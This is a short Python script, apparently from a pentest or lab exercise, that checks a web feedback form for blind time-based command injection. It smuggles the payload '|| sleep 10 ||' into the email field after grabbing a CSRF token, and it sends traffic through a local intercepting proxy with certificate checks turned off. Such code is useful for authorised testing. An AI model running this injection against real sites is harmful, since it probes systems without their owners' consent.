import requests
import sys
from bs4 import BeautifulSoup

# Configuración inicial
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def disable_warnings():
    """Deshabilita las advertencias de certificados no seguros."""
    from urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def get_csrf_token(session, url):
    """Obtiene el token CSRF de la página de feedback."""
    try:
        r = session.get(url, verify=False, proxies=proxies)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find("input", {"name": "csrf"})['value']
    except Exception as e:
        print(f"Error al obtener el token CSRF: {e}")
        return None

def check_command_injection(session, url, csrf_token):
    """Verifica si el sitio es vulnerable a inyección de comandos."""
    path = '/feedback/submit'
    command_injection = '|| sleep 10 ||'
    params = {
        'csrf': csrf_token,
        'name': 'pentester',
        'email': f'pentester@example.com{command_injection}',
        'subject': 'test',
        'message': 'test'
    }
    try:
        r = session.post(url + path, data=params, verify=False, proxies=proxies)
        return r.elapsed.total_seconds() > 10
    except Exception as e:
        print(f"Error durante la prueba de inyección de comandos: {e}")
        return False

def main(url):
    """Función principal."""
    disable_warnings()
    session = requests.Session()
    csrf_token = get_csrf_token(session, url + '/feedback')
    if csrf_token:
        if check_command_injection(session, url, csrf_token):
            print("[+] Vulnerable a inyección de comandos basada en tiempo.")
        else:
            print("[-] No vulnerable a inyección de comandos basada en tiempo.")
    else:
        print("No se pudo obtener el token CSRF.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <url>")
        sys.exit(1)
    main(sys.argv[1])
